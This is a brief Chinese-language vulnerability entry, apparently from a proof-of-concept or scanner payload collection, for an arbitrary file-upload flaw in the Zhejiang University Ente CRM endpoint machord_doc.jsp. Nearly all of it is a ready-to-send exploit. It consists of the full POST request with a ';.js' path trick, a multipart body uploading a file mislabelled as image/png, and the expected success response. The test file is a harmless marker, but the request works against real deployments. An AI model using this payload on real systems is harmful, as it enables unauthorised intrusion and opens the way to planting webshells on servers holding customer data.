# 浙大恩特CRMmachord_doc.jsp文件上传

- **系统**：浙大恩特CRMmachord_doc.jsp　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=dudesuite.txt&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKI…`

**请求体 / payload**
```
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="oprfilenam"
null
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadflg"
0
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="strAffixStr"
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="selfilenam"
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadfile"; filename="dudesuite.txt"
Content-Type: image/png
dudesuite
------WebKitFormBoundaryQzxXQpKIb1f32N11--
```
- **预期**：200　|　dudesuite.txt